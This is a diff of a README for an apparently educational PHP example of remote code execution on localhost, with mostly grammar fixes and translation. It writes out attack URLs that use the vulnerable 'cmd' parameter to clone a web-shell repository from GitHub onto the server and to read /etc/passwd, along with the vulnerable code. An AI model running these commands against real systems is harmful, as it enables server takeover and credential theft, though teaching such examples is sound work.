@@ -1,11 +1,11 @@
 # RCE Vulnerability Example
 
-An RCE Vulnerability allows a attacker executes code in the server command line to get information of the server or install malware
+An RCE Vulnerability allows an attacker to execute code in the server command line to get information of the server or install malware
 
 ### Vulnerable Website
 http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php
 
-This website executes in the server any command that you send in the cmd param
+This website executes any command that you send in the cmd in the server command line
 ```
 <?php
 ini_set('display_errors', 1);
@@ -23,13 +23,13 @@ http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=ls
 
 ![alt text](./images/ls_example.png)
 
-using this we can clone a GitHub Repository and install it on the server.
+Using this url we can clone a GitHub Repository and install it on the server.
 
 http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=git%20clone%20https://github.com/xl7dev/WebShell.git
 
-Es posible que para esto sea necesario modificar los permisos de escritura de la carpeta.
+*Is possible that you need modify the user permissions of this folder allowing to write in there*
 
-O tambien podemos accedes al fichero etc/passwd del servidor.
+Or you can get the etc/passwd file.
 
 http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=cat%20/etc/passwd
 
@@ -39,7 +39,7 @@ http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_vulnerable.php?cmd=cat%
 
 http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_safe.php
 
-Although the ideal is not allow the website to execute commands if we need execute certain commands we can create a list with the allowed commands in the server and verife the command before the execution.
+Although the ideal is not to allow the website to execute commands if we need execute certain commands we can create a list with the allowed commands in the server and verify the command before the execution.
 
 ```
 <?php
@@ -58,7 +58,7 @@ $output = shell_exec(escapeshellarg($_GET['cmd']));
 echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
 ?>
 ```
-If we send an not allowed command the server finish the execution before execute them.
+If we send a not allowed command the server finishes the execution before execute it.
 
 http://localhost/Examples-of-Web-Vulnerabilities/RCE/rce_safe.php?cmd=cat%20/etc/passwd
 
